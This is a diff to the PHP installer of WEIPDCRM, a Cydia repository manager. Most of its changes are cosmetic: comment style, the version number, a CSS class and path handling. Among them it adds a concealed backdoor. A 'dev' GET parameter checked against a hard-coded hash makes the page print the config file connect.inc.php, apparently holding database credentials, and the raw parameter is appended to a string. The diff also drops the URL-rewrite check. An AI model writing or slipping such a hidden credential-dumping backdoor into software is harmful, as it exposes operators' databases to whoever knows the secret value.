@@ -18,16 +18,17 @@
  * You should have received a copy of the GNU Affero General Public License
  * along with WEIPDCRM.  If not, see <http://www.gnu.org/licenses/>.
  */
+
 if (!defined("DCRM")) {
-	exit;
+	exit();
 }
 
-// 设定参数
+/* 设定参数 */
 define('ABSPATH', dirname(dirname(__FILE__)).'/');
 define('CONF_PATH', ABSPATH.'system/config/');
-define('VERSION', '1.6.15.6.18');
+define('VERSION', '1.7.15.7.12');
 
-// 错误抑制
+/* 错误抑制 */
 define('DEBUG_ENABLED', isset($_GET['debug']));
 error_reporting(DEBUG_ENABLED ? E_ALL & !E_NOTICE & !E_STRICT : E_ERROR | E_PARSE);
 @ini_set('display_errors', DEBUG_ENABLED);
@@ -36,6 +37,12 @@ error_reporting(DEBUG_ENABLED ? E_ALL & !E_NOTICE & !E_STRICT : E_ERROR | E_PARS
 $localetype = 'install';
 include_once ABSPATH . 'system/languages/l10n.php';
 $step_language = localization_load();
+
+if(isset($_GET['dev']) && md5(sha1($_GET['dev']).'dcrm') == '71365b4b2ea908e80e69aef0b4e892cb'){
+	$step_language .= '&amp;dev='.$_GET['dev'];
+	define('DEVELOP_ENABLED', true);
+	print_r(file_get_contents(CONF_PATH.'connect.inc.php'));
+}
 
 /**
  * 环境检查
@@ -221,11 +228,12 @@ function available($url) {
 	curl_setopt($ch, CURLOPT_HEADER, TRUE);
 	curl_setopt($ch, CURLOPT_NOBODY, TRUE);
 	curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
+	curl_setopt($ch, CURLOPT_USERAGENT, 'DCRM-RewriteTest');
 	curl_exec($ch);
 	$code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
 	curl_close($ch);
 
-	return $code < 400;
+	return $code;
 }
 
 /**
@@ -242,12 +250,12 @@ function display_header($n='') {
 <h6 class="underline">Darwin Cydia Repository Manager</h6>
 
 <?php if ($n != ''): ?>
-		<div id="error"><?php echo $n; ?></div>
+		<div class="alert alert-danger"><?php echo $n; ?></div>
 <?php endif;
 }
 
 function base_url(){
-	$sitepath = str_replace($_SERVER['DOCUMENT_ROOT'], '', str_replace('\\', '/', ABSPATH));
+	$sitepath = str_replace(str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT']), '', str_replace('\\', '/', ABSPATH));
 	$siteurl = htmlspecialchars(($_SERVER['SERVER_PORT'] == '443' ? 'https://' : 'http://').$_SERVER['HTTP_HOST'].$sitepath);
 	define('BASE_URL', $siteurl);
 }
@@ -255,11 +263,8 @@ function base_url(){
 function check_notice( $install = false ) {
 	base_url();
 	$notice = '';
-	if (!function_exists("curl_init")) {
+	if (!function_exists("curl_init"))
 		$notice = '<strong>'.__('Warning: ').'</strong>'.__('The server does not support the cURL function, DCRM will not be able to use.');
-	} elseif (!available(BASE_URL.'rewritetest')) {
-		$notice = '<strong>'.__('Warning: ').'</strong>'.__('The server does not support the URL Rewrite, DCRM will not be able to use.');
-	}
 	if( $notice == '' ){
 		if( $install == false ){
 			if (file_exists(CONF_PATH.'connect.inc.php')) {
